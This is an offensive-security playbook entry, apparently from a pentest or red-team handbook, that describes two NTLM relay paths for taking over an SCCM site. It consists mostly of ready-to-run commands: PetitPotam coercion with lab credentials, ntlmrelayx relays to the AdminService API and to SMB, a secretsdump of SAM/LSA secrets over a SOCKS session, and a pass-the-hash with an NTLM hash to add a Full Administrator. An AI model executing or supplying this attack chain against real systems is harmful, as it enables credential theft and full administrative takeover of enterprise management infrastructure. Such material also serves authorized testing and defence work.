# 17.16 SCCM Site Takeover II Relay to SMS Provider AdminService Passive Server

> Relay SCCM01$ to the SMS Provider AdminService REST API for Full Admin, or relay passive SCCM02$ to active SCCM01 SMB and dump SAM/LSA.

## Overview

Two additional NTLM relay paths: (1) Relay SCCM01$ authentication to the SMS Provider's AdminService REST API (HTTPS) to add a Full Administrator via the SMS_Admin WMI class — using a special impacket fork. (2) Relay the passive site server's machine account (SCCM02$) to the active server's SMB service, dump SAM/LSA with secretsdump, then use SCCM01$'s NTLM hash via sccmhunter to add a Full Admin.

## Steps

- For AdminService relay: clone garrettfoster13/impacket relay-sccm branch; run ntlmrelayx targeting https://<SMS_Provider>/AdminService/wmi/SMS_Admin with --adminservice --logonname --displayname --objectsid
- Coerce SCCM01$ with PetitPotam; ntlmrelayx adds the new admin via a 201 response
- For passive server relay: standard ntlmrelayx -t 172.50.0.21 -socks; coerce SCCM02$ with PetitPotam targeting passive server IP
- Use proxychains4 secretsdump.py 'LAB/SCCM02$'@172.50.0.21 -no-pass to dump SCCM01$ hashes
- Pass SCCM01$ NTLM hash to sccmhunter admin -u 'SCCM01$' -p <hash> -ip 172.50.0.40 to add admin

## Commands

### Clone relay-sccm impacket fork + install

```bash
git clone -b feature/relay-sccm-adminservice --single-branch https://github.com/garrettfoster13/impacket.git relay-sccm
```

### ntlmrelayx to AdminService API

```bash
python3 ntlmrelayx.py -t https://172.50.0.40/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "LAB\dario" --displayname "LAB\dario" --objectsid S-1-5-21-2570265163-3918697770-3667495639-2222
```

### Coerce SCCM01$ for AdminService relay

```bash
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 10.10.14.207 172.50.0.21
```

### ntlmrelayx for passive→active SMB relay

```bash
ntlmrelayx.py -t 172.50.0.21 -smb2support -socks
```

### Dump SCCM01$ hash via SOCKS session

```bash
proxychains4 -q secretsdump.py 'LAB/SCCM02$'@172.50.0.21 -no-pass
```

### Use SCCM01$ hash to add admin

```bash
python3 sccmhunter.py admin -u 'SCCM01$' -p aad3b435b51404eeaad3b435b51404ee:12287584ab4bb4ef1123f0ed2f08ff79 -ip 172.50.0.40
```
